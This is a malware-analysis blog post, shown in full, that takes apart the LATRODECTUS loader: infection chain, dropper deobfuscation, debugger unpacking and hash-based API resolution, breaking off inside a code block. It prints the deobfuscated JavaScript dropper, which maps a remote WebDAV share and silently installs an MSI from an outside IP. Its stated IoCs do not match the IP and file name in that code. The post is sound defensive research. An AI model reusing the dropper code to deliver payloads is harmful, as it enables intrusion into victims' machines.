<!DOCTYPE html>
<html lang="en-us">
  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />

    <meta http-equiv="cache-control" content="max-age=0" />
    <meta http-equiv="cache-control" content="no-cache" />
    <meta http-equiv="expires" content="0" />
    <meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT" />
    <meta http-equiv="pragma" content="no-cache" />

    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
    <link rel="manifest" href="/site.webmanifest">

    <meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff" />
    <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000000" />

    <meta name="description" content="goL0: reverse engineering &#43; malware analysis">

    
        <title>goL0: reverse engineering &#43; malware analysis | à¼§</title>
    

    
    <link rel="stylesheet" type="text/css" href="/style.min.50e5dce6bdbdda9c021bb01730b34c1639e90db55e0fd1ed0f37771832d1ce47.css" media="all">
  </head>

  <body>
        
        <nav>
          <ul class="menu">
            
                <li><a tabindex="-1" class="menu-link" href="/about/">about</a></li>
            
                <li><a tabindex="-1" class="menu-link" href="/cv/">cv</a></li>
            
                <li><a tabindex="-1" class="menu-link" href="/posts/">posts</a></li>
            
                <li><a tabindex="-1" class="menu-link" href="/photography/">photography</a></li>
            
          </ul>
        </nav>
        



<div id="single-header">
  <h1>
    goL0: reverse engineering + malware analysis
  </h1>
  <div id="single-meta">
    
    
        <span class="datesub">jan 26, 2024</span>
      

  </div>
</div>



<aside class="toc" id="tableOfContentContainer">
  <nav id="TableOfContents">
  <ul>
    <li><a href="#infection">infection</a></li>
    <li><a href="#stage-1-the-obfuscated-dropper">stage 1: the [obfuscated] dropper</a></li>
    <li><a href="#stage-2-the-unobfuscated-dropper">stage 2: the [unobfuscated] dropper</a></li>
    <li><a href="#stage-3-falcondll">stage 3: <code>falcon.dll</code></a></li>
    <li><a href="#stage-4-the-payload">stage 4: the payload</a></li>
    <li><a href="#functions">functions</a></li>
  </ul>

  <ul>
    <li>
      <ul>
        <li><a href="#follow-the-hash">follow the hash</a></li>
      </ul>
    </li>
    <li><a href="#resolving-modules--functions">resolving modules + functions</a></li>
    <li><a href="#nt-apis">NT APIs</a></li>
    <li><a href="#what-do-these-apis-do">what do these APIs do?</a></li>
  </ul>

  <ul>
    <li><a href="#renaming-remaining-functions">renaming remaining functions</a></li>
    <li><a href="#api-pivoting">API pivoting</a></li>
    <li><a href="#cryptography-refresher-xor-ciphers">cryptography refresher: XOR ciphers</a>
      <ul>
        <li><a href="#xor-ciphers-in-malware">XOR ciphers in malware</a></li>
      </ul>
    </li>
    <li><a href="#string-decryption">string decryption</a></li>
  </ul>

  <ul>
    <li><a href="#detecting-the-tactics--techniques-used-by-latrodectus">detecting the tactics + techniques used by <code>LATRODECTUS</code></a>
      <ul>
        <li><a href="#recap-dynamic-api-resolution--string-decryption">recap: dynamic API resolution + string decryption</a></li>
        <li><a href="#oversized-windows-script-execution">oversized windows script execution</a></li>
        <li><a href="#execution-via-suspicious-wmi-client">execution via suspicious WMI client</a></li>
        <li><a href="#remote-file-execution-via-msiexec">remote file execution via <code>MSIEXEC</code></a></li>
        <li><a href="#rundll32-or-regsvr32-loaded-a-dll-from-unbacked-memory"><code>rundll32</code> or <code>regsvr32</code> loaded a DLL from unbacked memory</a></li>
        <li><a href="#network-module-loaded-from-suspicious-unbacked-memory">network module loaded from suspicious unbacked memory</a></li>
        <li><a href="#shellcode-execution-from-low-reputation-module">shellcode execution from low reputation module</a></li>
        <li><a href="#virtualprotect-api-call-from-an-unsigned-dll"><code>VirtualProtect</code> API call from an unsigned DLL</a></li>
        <li><a href="#scheduled-task-creation-by-an-unusual-process">scheduled task creation by an unusual process</a></li>
        <li><a href="#potential-self-deletion-of-a-running-executable">potential self deletion of a running executable</a></li>
        <li><a href="#long-termhigh-count-of-network-connections-by-rundll32">long-term/high-count of network connections by <code>rundll32</code></a></li>
        <li><a href="#command-shell-activity-started-via-rundll32">command shell activity started via <code>rundll32</code></a></li>
      </ul>
    </li>
    <li><a href="#conclusion">conclusion</a></li>
  </ul>
</nav>
</aside>


<main><p><p class="imgp">
  <img loading="lazy" src="/binja.png" alt="binja"  />
</p>
</p>
<p><code>LATRODECTUS</code> is an emerging malware loader that i first encountered during my research at the start of 2024. initially discovered by walmart&rsquo;s security team, it quickly gained attention due to the similarities it held with <code>ICEDID</code>, particularly in the use of a command handler for downloading and executing encrypted payloads. proofpoint and team cymru both established a link between the network infrastructure used by operators of both <code>LATRODECTUS</code> and <code>ICEDID</code>, suggesting a common origin.</p>
<p><code>LATRODECTUS</code> is a simple + efficient malware, that&rsquo;s part of a new trend in malware development, where the emphasis is on lightweight, direct-action tools. it contains only 11 command handlers, focused on tasks like enumeration + execution.</p>
<h2 id="infection">infection</h2>
<p>infection typically begins with a spam email that points (via URL or PDF) to an oversized JavaScript dropper.</p>
<p>once executed, the dropper leverages WMI [Windows Management Instrumentation] to invoke <code>msiexec.exe</code>, which then downloads + installs an <code>.msi</code> file from a remote WebDAV share.</p>
<p>this <code>.msi</code> file is responsible for executing <code>LATRODECTUS</code> on the target. when the <code>.msi</code> is executed, it executes a packed DLL which further obfuscates its presence by copying itself to a different location and executing from there.</p>
<p>when it&rsquo;s re-executed, the DLL establishes a connection back to the C2 server for further comms.</p>
<h2 id="stage-1-the-obfuscated-dropper">stage 1: the [obfuscated] dropper</h2>
<p>i grabbed the dropper from MalwareBazaar: <code>hxxps[://]bazaar[.]abuse[.]ch/sample/4ff60df7d165862e652f73752eb98cf92202a2d748b055ff1f99d4172fa4c92f/</code></p>
<p>this is a javascript based dropper. it&rsquo;s heavily commented and obfuscated, with real commands being preceded by <code>////</code>.</p>
<p>here&rsquo;s a snapshot of the code.</p>
<p><p class="imgp">
  <img loading="lazy" src="/dropper-obf.png" alt="obfuscated dropper"  />
</p>
</p>
<p>once the pattern is figured out, a regex-based python script is enough to clean it up.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">import</span> re
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">extract_code_lines</span>(input_file, output_file):
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># open input file + read all lines</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">with</span> <span style="color:#8be9fd;font-style:italic">open</span>(input_file, <span style="color:#f1fa8c">&#39;r&#39;</span>) <span style="color:#ff79c6">as</span> file:
</span></span><span style="display:flex;"><span>        lines <span style="color:#ff79c6">=</span> file<span style="color:#ff79c6">.</span>readlines()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># hold the extracted lines of legitimate code</span>
</span></span><span style="display:flex;"><span>    code_lines <span style="color:#ff79c6">=</span> []
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># iterate over each line to determine if it&#39;s legitimate code</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">for</span> line <span style="color:#ff79c6">in</span> lines:
</span></span><span style="display:flex;"><span>        <span style="color:#6272a4"># check if line starts with &#34;////&#34; or doesn&#39;t start with &#34;//&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> line<span style="color:#ff79c6">.</span>startswith(<span style="color:#f1fa8c">&#39;////&#39;</span>):
</span></span><span style="display:flex;"><span>            <span style="color:#6272a4"># remove leading four slashes + any extra spaces, then add to code lines</span>
</span></span><span style="display:flex;"><span>            code_lines<span style="color:#ff79c6">.</span>append(line[<span style="color:#bd93f9">4</span>:]<span style="color:#ff79c6">.</span>lstrip())
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">elif</span> <span style="color:#ff79c6">not</span> line<span style="color:#ff79c6">.</span>startswith(<span style="color:#f1fa8c">&#39;//&#39;</span>):
</span></span><span style="display:flex;"><span>            <span style="color:#6272a4"># if line doesn&#39;t start with &#34;//&#34;, it&#39;s legitimate code, add it as is</span>
</span></span><span style="display:flex;"><span>            code_lines<span style="color:#ff79c6">.</span>append(line)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># write extracted code lines to output file</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">with</span> <span style="color:#8be9fd;font-style:italic">open</span>(output_file, <span style="color:#f1fa8c">&#39;w&#39;</span>) <span style="color:#ff79c6">as</span> file:
</span></span><span style="display:flex;"><span>        file<span style="color:#ff79c6">.</span>writelines(code_lines)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># example</span>
</span></span><span style="display:flex;"><span>input_file <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;4ff60df7d165862e652f73752eb98cf92202a2d748b055ff1f99d4172fa4c92f.js&#39;</span>  <span style="color:#6272a4"># replace with input file name</span>
</span></span><span style="display:flex;"><span>output_file <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;dropper-clean.js&#39;</span>  <span style="color:#6272a4"># replace with output file name</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>extract_code_lines(input_file, output_file)
</span></span></code></pre></div><p>this script outputs to a cleaned-up file, which is the unobfuscated dropper.</p>
<h2 id="stage-2-the-unobfuscated-dropper">stage 2: the [unobfuscated] dropper</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">var</span> network <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> ActiveXObject(<span style="color:#f1fa8c">&#34;WScript.Network&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">var</span> wmi <span style="color:#ff79c6">=</span> GetObject(<span style="color:#f1fa8c">&#34;winmgmts:\\\\.\\root\\cimv2&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">var</span> attempt <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">var</span> connected <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">false</span>;
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">var</span> driveLetter, letter;
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">function</span> isDriveMapped(letter) {
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">var</span> drives <span style="color:#ff79c6">=</span> network.EnumNetworkDrives();
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">for</span> (<span style="color:#8be9fd;font-style:italic">var</span> i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;</span> drives.length; i <span style="color:#ff79c6">+=</span> <span style="color:#bd93f9">2</span>) {
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> (drives.Item(i) <span style="color:#ff79c6">===</span> letter) {
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">return</span> <span style="color:#ff79c6">true</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">return</span> <span style="color:#ff79c6">false</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">for</span> (driveLetter <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">90</span>; driveLetter <span style="color:#ff79c6">&gt;=</span> <span style="color:#bd93f9">65</span> <span style="color:#ff79c6">&amp;&amp;</span> <span style="color:#ff79c6">!</span>connected; driveLetter<span style="color:#ff79c6">--</span>) {
</span></span><span style="display:flex;"><span>letter <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">String</span>.fromCharCode(driveLetter) <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#34;:&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span>isDriveMapped(letter)) {
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">try</span> {
</span></span><span style="display:flex;"><span>network.MapNetworkDrive(letter, <span style="color:#f1fa8c">&#34;\\\\95.164.3.171@80\\share\\&#34;</span>);
</span></span><span style="display:flex;"><span>connected <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">true</span>;
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">break</span>;
</span></span><span style="display:flex;"><span>} <span style="color:#ff79c6">catch</span> (e) {
</span></span><span style="display:flex;"><span>attempt<span style="color:#ff79c6">++</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span>connected <span style="color:#ff79c6">&amp;&amp;</span> attempt <span style="color:#ff79c6">&gt;</span> <span style="color:#bd93f9">5</span>) {
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">var</span> command <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;net use &#39;</span> <span style="color:#ff79c6">+</span> letter <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#39; \\\\95.164.3.171@80\\share\\ /persistent:no&#39;</span>;
</span></span><span style="display:flex;"><span>wmi.Get(<span style="color:#f1fa8c">&#34;Win32_Process&#34;</span>).Create(command, <span style="color:#ff79c6">null</span>, <span style="color:#ff79c6">null</span>, <span style="color:#ff79c6">null</span>);
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">var</span> startTime <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> <span style="color:#8be9fd;font-style:italic">Date</span>();
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">while</span> (<span style="color:#ff79c6">new</span> <span style="color:#8be9fd;font-style:italic">Date</span>() <span style="color:#ff79c6">-</span> startTime <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">3000</span>) {} 
</span></span><span style="display:flex;"><span>connected <span style="color:#ff79c6">=</span> isDriveMapped(letter);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> (connected) {
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">var</span> installCommand <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;msiexec.exe /i \\\\95.164.3.171@80\\share\\cisa.msi /qn&#39;</span>;
</span></span><span style="display:flex;"><span>wmi.Get(<span style="color:#f1fa8c">&#34;Win32_Process&#34;</span>).Create(installCommand, <span style="color:#ff79c6">null</span>, <span style="color:#ff79c6">null</span>, <span style="color:#ff79c6">null</span>);
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">try</span> {
</span></span><span style="display:flex;"><span>network.RemoveNetworkDrive(letter, <span style="color:#ff79c6">true</span>, <span style="color:#ff79c6">true</span>);
</span></span><span style="display:flex;"><span>} <span style="color:#ff79c6">catch</span> (e) {
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>} <span style="color:#ff79c6">else</span> {
</span></span><span style="display:flex;"><span>WScript.Echo(<span style="color:#f1fa8c">&#34;Failed.&#34;</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">var</span> fsObj <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> ActiveXObject(<span style="color:#f1fa8c">&#34;Scripting.FileSystemObject&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">var</span> selfPath <span style="color:#ff79c6">=</span> WScript.ScriptFullName;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">try</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> (fsObj.FileExists(selfPath)) {
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">var</span> selfFile <span style="color:#ff79c6">=</span> fsObj.OpenTextFile(selfPath, <span style="color:#bd93f9">1</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">var</span> codeToExecute <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;&#34;</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">while</span> (<span style="color:#ff79c6">!</span>selfFile.AtEndOfStream) {
</span></span><span style="display:flex;"><span>            <span style="color:#8be9fd;font-style:italic">var</span> currentLine <span style="color:#ff79c6">=</span> selfFile.ReadLine();
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">if</span> (currentLine.indexOf(<span style="color:#f1fa8c">&#34;////&#34;</span>) <span style="color:#ff79c6">===</span> <span style="color:#bd93f9">0</span>) {
</span></span><span style="display:flex;"><span>                codeToExecute <span style="color:#ff79c6">+=</span> currentLine.substring(<span style="color:#bd93f9">4</span>) <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#34;\n&#34;</span>;
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        selfFile.Close();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> (codeToExecute) {
</span></span><span style="display:flex;"><span>            <span style="color:#8be9fd;font-style:italic">var</span> executeFunction <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> <span style="color:#8be9fd;font-style:italic">Function</span>(codeToExecute); 
</span></span><span style="display:flex;"><span>            executeFunction();
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>} <span style="color:#ff79c6">catch</span> (error) {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>the unobfuscated dropper is now ready for analysis. some indicators of compromise (IoCs) to look for are <code>45.95.11.134:80</code> connecting to <code>\share\</code> folder, and using <code>msiexec.exe</code> to grab <code>qual.msi</code> from the above C2 server.</p>
<p>Orca (provided by the Windows SDK) can be used to analyze or edit <code>qual.msi</code>. head over to <code>CustomAction</code> to view the <code>LaunchFile</code> target. this launches a file: <code>rundll32.exe</code>. its export entry is <code>vgml</code> and it&rsquo;s stored at <code>LocalAppDataFolder\stat\falcon.dll</code>.</p>
<p>you could also use UniExtract to extract <code>qual.msi</code>. it will create the directory <code>LocalAppDataFolder\stat\falcon.dll</code>. i copied the DLL to a separate directory for analysis. this commences stage 3.</p>
<h2 id="stage-3-falcondll">stage 3: <code>falcon.dll</code></h2>
<p>this is a packed DLL that contains another DLL inside it, which is the main payload.</p>
<p>you can use x64dbg, IDA, or Binary Ninja to analyze the DLL and payload. i used a combo of IDA and Binary Ninja.</p>
<p>open <code>rundll32.exe</code>. remove all breakpoints and change the command line: remove the old path and add the new path (<code>falcon.dll</code>) and restart.</p>
<p>select <code>user DLL entry</code> and <code>user DLL load</code> in preferences. keep hitting play until the name of the module (<code>falcon.dll</code>) is displayed.</p>
<p>follow the expression <code>vgml</code> (<code>ctrl + g</code>) and set a breakpoint at <code>18000D960</code>.</p>
<p>follow <code>VirtualAlloc</code> and scroll down to find <code>ret</code>. set a breakpoint at <code>7FFA8FCFE5DA</code>.</p>
<p>follow <code>VirtualProtect</code> and set a breakpoint at <code>7FFA90D1BF80</code>.</p>
<p>now, hit play until the first breakpoint (<code>VirtualAlloc ret</code>) is hit. take the <code>RAX</code> value (<code>140FDCD0000</code>) and follow it in Dump #1. hit play again to see the unpacked payload inside the allocated memory.</p>
<p><p class="imgp">
  <img loading="lazy" src="/image.png" alt="unpacked payload inside allocated memory"  />
</p>
</p>
<p>caution: hitting play again would execute the payload. so dump it first by following the address <code>140FDCD0000</code> in Memory Map then dump the memory to a file and save it. this commences stage 4.</p>
<h2 id="stage-4-the-payload">stage 4: the payload</h2>
<p>examine the generated <code>rundll32_00000140FDCD0000.bin</code> in IDA by going to Exports and selecting any of the entries to then open the decompiler. hit <code>run</code> at <code>180003CE4</code>, ordinal 3. enter the functions to check the hashes being declared and resolved to confirm that this is indeed the final payload.</p>
<p>first, make sure everything is decompiled properly: produce file -&gt; create C file [ctrl+f5]. this forces IDA to decompile the binary.</p>
<p>head to exports and select the <code>run</code> function. use the decompiler and disassembly side-by-side (you can hit F5 to open the disassembly window).</p>
<p><p class="imgp">
  <img loading="lazy" src="/image-1.png" alt="decompiler &#43; disassembly"  />
</p>
</p>
<p>enter the first function inside the disassembly: <code>sub_180003CB4();</code>. inside it, there&rsquo;s another function <code>sub_180003868();</code>. enter that. we&rsquo;ll forego the first function [<code>sub_18000AC6C();</code>] for now and head to the second function: <code>sub_180006298();</code>.</p>
<h2 id="functions">functions</h2>
<p><code>sub_180006298();</code> is defined as follows.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">__int64</span> <span style="color:#50fa7b">sub_180006298</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> ( (<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span>)sub_180008388() 
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&amp;&amp;</span> (<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span>)sub_18000AA30()
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&amp;&amp;</span> (<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span>)sub_18000A3F8()
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&amp;&amp;</span> (<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span>)sub_180008328()
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&amp;&amp;</span> (<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span>)sub_18000A2D8()
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&amp;&amp;</span> (<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span>)sub_180008EF0() )
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span> sub_18000AAAC;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">else</span>
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0LL</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>let&rsquo;s go through each of the functions here and try to decipher what&rsquo;s going on.</p>
<h1 id="sub_180008388"><code>sub_180008388()</code></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">__int64</span> <span style="color:#50fa7b">sub_180008388</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">int</span> i; <span style="color:#6272a4">// [rsp+20h] [rbp-28h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">for</span> ( i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; <span style="color:#ff79c6">!</span>i; i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">1</span> )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        unk_180010EB0 <span style="color:#ff79c6">=</span> sub_18000821C(<span style="color:#bd93f9">0x2ECA438C</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> ( <span style="color:#ff79c6">!</span>unk_180010EB0 )
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0LL</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">1LL</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h1 id="sub_180000821c"><code>sub_180000821C()</code></h1>
<p>examining <code>sub_180000821C()</code> shows that it iterates through the modules loaded in the executable.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">_LIST_ENTRY</span> <span style="color:#ff79c6">*</span><span style="color:#ff79c6">__fastcall</span> <span style="color:#50fa7b">sub_18000821C</span>(<span style="color:#8be9fd">int</span> a1)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span> v2; <span style="color:#6272a4">// [rsp+20h] [rbp-28h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">_LIST_ENTRY</span> <span style="color:#ff79c6">*</span>i; <span style="color:#6272a4">// [rsp+28h] [rbp-20h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    _WORD <span style="color:#ff79c6">*</span>v4; <span style="color:#6272a4">// [rsp+30h] [rbp-18h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">for</span> ( i <span style="color:#ff79c6">=</span> sub_180008534()<span style="color:#ff79c6">-&gt;</span>Ldr<span style="color:#ff79c6">-&gt;</span>InLoadOrderModuleList.Flinkl i[<span style="color:#bd93f9">3</span>].Flink)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        v4 <span style="color:#ff79c6">=</span> sub_18000BB0C((<span style="color:#ff79c6">__int64</span>)i[<span style="color:#bd93f9">6</span>].Flink, LOWORD(i[<span style="color:#bd93f9">5</span>].Blink));
</span></span><span style="display:flex;"><span>        v2 <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">2</span> <span style="color:#ff79c6">*</span> sub_18000B8C0((int64)v4);
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> ( (<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span>)sub_180006A14((<span style="color:#ff79c6">__int64</span>)v4, v2) <span style="color:#ff79c6">==</span> a1 )
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span> i[<span style="color:#bd93f9">3</span>].Flink;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0LL</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h3 id="follow-the-hash">follow the hash</h3>
<p>there&rsquo;s a hash [<code>0x2ECA438C</code>] being passed to the function <code>unk_180010EB0()</code> via the function <code>sub_18000821C()</code>. we can use this &ldquo;canary&rdquo; of a hash to find out where else it pops up in the program. x64dbg has a fantastic plugin called HashDB Hunt Algorithm. this feature reveals that the the algorithm <code>crc32</code> [32B in size] also contains the hash.</p>
<p>HashDB Lookup is another feature that can find what module this hash corresponds to. it tells us that the hash matches that of <code>kernel32.dll</code>, and adds it to the enums.</p>
<p>so:
<code>0x2ECA438C</code> can now be resolved to the module <code>kernel32.dll</code>; the address <code>sub_180008388()</code> can be resolved to <code>mw_resolve_kernel32.dll</code>; the address <code>unk_180010EB0</code> can be resolved to <code>mw_handle_kernel32_dll</code>. by inference, we can resolve <code>sub_180000821C()</code> to <code>mw_get_module_handle()</code>.</p>
<p>we can now rewrite the function <code>sub_1800008388()</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">__int64</span> <span style="color:#50fa7b">mw_resolve_kernel32_dll</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">int</span> i; <span style="color:#6272a4">// [rsp+20h] [rbp-28h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">for</span> ( i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; <span style="color:#ff79c6">!</span>i; i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">1</span> )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        mw_handle_kernel32_dll <span style="color:#ff79c6">=</span> mw_get_module_handle(kernel32_dll);
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> ( <span style="color:#ff79c6">!</span>mw_handle_kernel32_dll )
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0LL</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">1LL</span>;
